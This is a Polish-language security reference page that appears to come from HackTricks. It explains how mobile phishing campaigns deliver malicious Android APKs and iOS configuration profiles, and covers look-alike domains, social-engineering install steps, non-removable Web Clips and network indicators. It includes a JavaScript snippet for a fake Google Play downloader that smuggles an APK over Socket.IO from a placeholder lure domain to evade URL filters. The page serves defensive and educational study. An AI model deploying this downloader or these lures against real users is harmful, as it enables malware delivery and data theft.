# Phishing mobilny i dystrybucja złośliwych aplikacji (Android i iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Ta strona opisuje techniki wykorzystywane przez threat actors do dystrybucji **złośliwych plików APK dla Androida** i **profili konfiguracji mobilnej dla iOS** za pośrednictwem phishingu (SEO, social engineering, fałszywe sklepy, aplikacje randkowe itp.).
> Materiał został zaadaptowany na podstawie kampanii SarangTrap ujawnionej przez Zimperium zLabs (2025) oraz innych publicznych badań.<sup>[[1]](#references)</sup>

## Przebieg ataku

1. **Infrastruktura SEO/Phishing**
* Rejestracja dziesiątek podobnych domen (randkowych, udostępniania w chmurze, usług samochodowych itp.).
– Używanie słów kluczowych w lokalnym języku i emoji w elemencie `<title>` w celu uzyskania wyższej pozycji w Google.
– Hostowanie instrukcji instalacji zarówno dla Androida (`.apk`), jak i iOS na tej samej stronie docelowej.
2. **Pobieranie pierwszego etapu**
* Android: bezpośredni link do niepodpisanego pliku APK lub pliku APK pochodzącego z „third-party store”.
* iOS: link `itms-services://` lub zwykły link HTTPS do złośliwego profilu **mobileconfig** (zobacz poniżej).
3. **Zachowanie malware na Androidzie po instalacji**
* Wykonywanie kontrolowane przez C2, nadużywanie uprawnień, omijanie zabezpieczeń droppera, zbieranie danych w tle oraz inne zachowania malware po instalacji zostały opisane na dedykowanej stronie Android Malware Post-Exploitation poniżej.
4. **Technika dostarczania na iOS**
* Pojedynczy **profil konfiguracji mobilnej** może żądać `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` itd., aby zapisać urządzenie w nadzorze podobnym do „MDM”.
* Instrukcje wykorzystujące social engineering:
1. Otwórz Ustawienia ➜ *Pobrano profil*.
2. Naciśnij *Zainstaluj* trzy razy (zrzuty ekranu na stronie phishingowej).
3. Zaufaj niepodpisanemu profilowi ➜ attacker uzyskuje uprawnienia do *Kontaktów* i *Zdjęć* bez weryfikacji App Store.
5. **Payload Web Clip na iOS (ikona aplikacji phishingowej)**
* Payloady `com.apple.webClip.managed` mogą **przypiąć adres URL phishingu do ekranu początkowego** za pomocą oznaczonej brandingiem ikony/etykiety.
* Web Clips mogą działać **w trybie pełnoekranowym** (ukrywając interfejs przeglądarki) i być oznaczone jako **niemożliwe do usunięcia**, zmuszając ofiarę do usunięcia profilu w celu usunięcia ikony.<sup>[[3]](#references)</sup>
6. **Warstwa sieciowa**
* Zwykły HTTP, często na porcie 80, z nagłówkiem HOST w rodzaju `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (brak TLS → łatwe do wykrycia).

## Android Malware Post-Exploitation

Informacje o tradecraft malware na Androidzie po instalacji, takich jak C2, nadużywanie Accessibility, overlays, automatyzacja ATS, staged DEX loading, premium SMS i persistence, znajdziesz na dedykowanej stronie:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Smuggling APK oparty na Socket.IO/WebSocket + fałszywe strony Google Play

Attackers coraz częściej zastępują statyczne linki APK kanałem Socket.IO/WebSocket osadzonym w przynętach wyglądających jak Google Play. Ukrywa to URL payloadu, omija filtry URL/rozszerzeń i zachowuje realistyczny UX instalacji.<sup>[[2]](#references)[[4]](#references)</sup>

Typowy przepływ klienta obserwowany w rzeczywistych kampaniach:

<details>
<summary>Fałszywy downloader Play oparty na Socket.IO (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Dlaczego omija proste mechanizmy kontroli:
- Nie jest ujawniany żaden statyczny URL pliku APK; payload jest rekonstruowany w pamięci z ramek WebSocket.
- Filtry URL/MIME/rozszerzeń, które blokują bezpośrednie odpowiedzi .apk, mogą nie wykryć danych binarnych tunelowanych za pośrednictwem WebSockets/Socket.IO.
- Crawlers i sandboxy URL, które nie wykonują WebSockets, nie pobiorą payloadu.

Zobacz także tradecraft i narzędzia WebSocket:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Referencje

- [1] [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Ustawienia payloadu Web Clips dla urządzeń Apple](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Banker Trojan Targeting Indonesian and Vietnamese Android Users](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)

{{#include ../../banners/hacktricks-training.md}}
